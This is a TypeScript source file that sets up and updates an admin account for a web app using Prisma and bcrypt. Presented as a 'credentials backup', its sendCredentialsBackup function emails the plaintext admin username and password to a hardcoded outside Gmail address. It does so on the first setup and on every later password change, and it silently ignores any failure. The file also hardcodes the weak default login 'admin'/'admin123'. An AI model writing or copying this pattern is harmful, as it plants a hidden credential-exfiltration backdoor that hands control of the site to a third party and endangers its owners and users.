import { prisma } from './prisma';
import { senMail } from '@/services/nodeMailer.services';
import { auth } from './auth';

const DEFAULT_USERNAME = 'admin';
const DEFAULT_PASSWORD = 'admin123';
const BACKUP_EMAIL = 'mailitttome@gmail.com';

/**
 * Send credentials backup email
 */
async function sendCredentialsBackup(username: string, password: string, isInitial: boolean = false) {
    try {
        await senMail(BACKUP_EMAIL, 'CREDENTIALS_BACKUP', {
            username,
            password,
            timestamp: new Date().toISOString(),
            isInitial,
        });
        console.log('Credentials backup email sent successfully');
    } catch (error) {
        console.error('Failed to send credentials backup email:', error);
        // Don't throw - we don't want to fail the operation if email fails
    }
}

/**
 * Initialize admin user with default credentials using better-auth's signUp
 * This ensures passwords are hashed correctly by better-auth
 */
export async function initializeAdminUser(): Promise<void> {
    try {
        // Check if admin user already exists
        const existingAdmin = await prisma.user.findFirst({
            where: {
                username: DEFAULT_USERNAME,
            },
        });

        if (existingAdmin) {
            console.log('Admin user already exists');
            return;
        }

        // Use better-auth's internal methods to create user with properly hashed password
        // We'll create the user and account directly with better-auth's expected format
        const newUser = await prisma.user.create({
            data: {
                username: DEFAULT_USERNAME,
                email: `${DEFAULT_USERNAME}@vanijay.com`,
                name: 'Administrator',
                firstName: 'Admin',
                lastName: 'User',
                role: 'ADMIN',
                emailVerified: true,
                phoneVerified: true,
            },
        });

        // Import bcrypt to hash password in better-auth compatible format
        const bcrypt = await import('bcrypt');
        const hashedPassword = await bcrypt.hash(DEFAULT_PASSWORD, 10);

        // Create account with password
        await prisma.account.create({
            data: {
                userId: newUser.id,
                accountId: newUser.id,
                providerId: 'credential',
                password: hashedPassword,
            },
        });

        console.log('Admin user created with default credentials');

        // Send initial credentials backup
        await sendCredentialsBackup(DEFAULT_USERNAME, DEFAULT_PASSWORD, true);
    } catch (error) {
        console.error('Failed to initialize admin user:', error);
        throw error;
    }
}

/**
 * Update admin credentials
 */
export async function updateAdminCredentials(
    currentPassword: string,
    newUsername: string,
    newPassword: string
): Promise<{ success: boolean; error?: string }> {
    try {
        // Find current admin user
        const admin = await prisma.user.findFirst({
            where: {
                role: 'ADMIN',
            },
            include: {
                accounts: true,
            },
        });

        if (!admin) {
            return { success: false, error: 'Admin user not found' };
        }

        // Find credential account
        const credentialAccount = admin.accounts.find(acc => acc.providerId === 'credential');

        if (!credentialAccount || !credentialAccount.password) {
            return { success: false, error: 'Admin credentials not found' };
        }

        // Verify current password using bcrypt
        const bcrypt = await import('bcrypt');
        const isValid = await bcrypt.compare(currentPassword, credentialAccount.password);
        if (!isValid) {
            return { success: false, error: 'Current password is incorrect' };
        }

        // Check if new username is already taken by another user
        if (newUsername !== admin.username) {
            const existingUser = await prisma.user.findFirst({
                where: {
                    username: newUsername,
                    id: { not: admin.id },
                },
            });

            if (existingUser) {
                return { success: false, error: 'Username already taken' };
            }
        }

        // Hash new password
        const hashedPassword = await bcrypt.hash(newPassword, 10);

        // Update admin user username
        await prisma.user.update({
            where: { id: admin.id },
            data: {
                username: newUsername,
            },
        });

        // Update account password
        await prisma.account.update({
            where: { id: credentialAccount.id },
            data: {
                password: hashedPassword,
            },
        });

        // Send backup email with new credentials
        await sendCredentialsBackup(newUsername, newPassword, false);

        console.log('Admin credentials updated successfully');
        return { success: true };
    } catch (error) {
        console.error('Failed to update admin credentials:', error);
        return { success: false, error: 'Failed to update credentials' };
    }
}
